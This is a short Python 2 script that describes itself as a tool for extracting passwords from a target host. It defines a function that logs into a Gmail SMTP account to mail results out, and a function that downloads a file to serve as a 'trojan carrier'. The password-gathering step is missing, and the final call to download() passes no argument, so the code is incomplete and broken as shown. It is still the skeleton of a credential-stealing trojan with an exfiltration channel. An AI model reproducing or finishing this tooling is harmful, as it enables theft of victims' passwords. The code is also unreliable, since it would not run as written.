#! /usr/bin/python
"""A simple script used to extract passwords from a target host.
   Uses Python 2.7.16"""

import subprocess
import optparse
import requests
import smtplib


def send_mail(email, password, message):
    """Sends email with """
    server = smtplib.SMTP('smtp.gmail.com', 587)                # gmail smtp server address and port
    server.starttls()
    server.login(email, password)                               # logs into email account
    server.sendmail(email, email, message)                      # sends email from 'email' account to 'email' account
    server.quit()


def get_arguments():
    """Get user supplied arguments from terminal."""
    parser = optparse.OptionParser()
    # arguments
    parser.add_option('-t', '--target', dest='target', help='File to obtain from the Internet.')

    (options, arguments) = parser.parse_args()

    return options


def download(url):
    """Obtains a document from the Internet to use as a trojan carrier file."""
    get_response = requests.get(url)

    file_name = url.split('/')[-1]

    with open(file_name, 'wb') as out_file:
        """Writes output to file on local disk"""
        out_file.write(get_response.content)


download()

